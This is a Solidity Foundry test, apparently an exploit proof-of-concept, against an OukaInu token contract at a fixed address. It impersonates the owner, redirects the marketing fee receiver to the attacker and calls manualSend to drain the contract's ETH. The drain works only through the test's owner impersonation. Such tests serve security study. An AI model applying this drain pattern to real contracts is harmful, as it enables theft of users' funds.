// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IOukaInu {
    function getOwner() external view returns (address);
    function setFeeReceivers(
        address _autoLiquidityReceiver,
        address _marketingFeeReceiver,
        address _buyBackFeeReceiver,
        address _developmentFeeReceiver,
        address _charityFeeReceiver,
        address _stakingFeeReceiver
    ) external;
    function manualSend() external;

    function autoLiquidityReceiver() external view returns (address);
    function marketingFeeReceiver() external view returns (address);
    function buyBackFeeReceiver() external view returns (address);
    function developmentFeeReceiver() external view returns (address);
    function charityFeeReceiver() external view returns (address);
    function stakingFeeReceiver() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x4A33D3ea4B30228C363222746939562FbAba2f01;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        deal(TARGET, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        address owner = IOukaInu(TARGET).getOwner();

        vm.startPrank(owner);

        // To be safe and only change what's necessary, we get the current fee receivers first.
        address _autoLiquidityReceiver = IOukaInu(TARGET).autoLiquidityReceiver();
        address _buyBackFeeReceiver = IOukaInu(TARGET).buyBackFeeReceiver();
        address _developmentFeeReceiver = IOukaInu(TARGET).developmentFeeReceiver();
        address _charityFeeReceiver = IOukaInu(TARGET).charityFeeReceiver();
        address _stakingFeeReceiver = IOukaInu(TARGET).stakingFeeReceiver();

        // Set the marketing fee receiver to the attacker's address.
        IOukaInu(TARGET).setFeeReceivers(
            _autoLiquidityReceiver,
            attacker,
            _buyBackFeeReceiver,
            _developmentFeeReceiver,
            _charityFeeReceiver,
            _stakingFeeReceiver
        );

        // Call manualSend to drain the contract's balance.
        IOukaInu(TARGET).manualSend();

        vm.stopPrank();
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

